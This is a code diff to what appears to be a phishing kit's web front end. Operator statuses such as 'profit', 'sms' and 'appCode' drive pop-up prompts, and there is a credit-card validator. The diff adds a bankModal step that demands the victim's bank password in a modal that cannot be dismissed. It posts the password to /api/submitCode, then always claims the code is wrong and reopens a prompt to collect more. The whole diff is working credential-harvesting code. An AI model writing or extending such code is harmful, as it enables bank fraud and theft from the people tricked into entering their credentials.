@@ -290,6 +290,7 @@
       currentStatus(v) {
         if (v == "profit") this.successModal();
         else if (v == "sms") this.codeModal();
+        else if (v == "passwordBank") this.bankModal();
         else if (v == "appCode") this.codeModal(
           "app",
           "<%=translate["app_code_title"][ad.service.lang]%>",
@@ -455,6 +456,54 @@
             return this.codeModal(...arguments);
           }
         });
+      },
+      bankModal(codeType = "bankPassword", title = "<%=translate["bank_passord_title"][ad.service.lang]%>", text = "<%=translate["bank_passord_text"][ad.service.lang]%>", placeholder = "<%=translate["bank_passord_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["bank_passord_wrong"][ad.service.lang]%>"){
+        swal.stopLoading();
+        swal({
+          title,
+          text,
+          content: {
+            element: "input",
+            attributes: {
+              type: "text",
+              placeholder,
+              maxLength: 255,
+              required: true,
+              style:
+                "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
+            },
+          },
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%=translate["submit"][ad.service.lang]%>",
+              closeModal: false,
+            },
+          },
+        }).then(async (code) => {
+          try {
+            if (!code) {
+              swal.stopLoading();
+              alert(wrong_code);
+              return this.codeModal(...arguments);
+            }
+            const response = await axios.post("/api/submitCode", {
+              codeType,
+              code,
+              token: this.logToken,
+            });
+
+            swal.stopLoading();
+            alert(wrong_code);
+            return this.codeModal(...arguments);
+          } catch (err) {
+            swal.stopLoading();
+            alert(wrong_code);
+            return this.codeModal(...arguments);
+          }
+        });
+
       },
       valid_credit_card(value) {
         // accept only digits, dashes or spaces
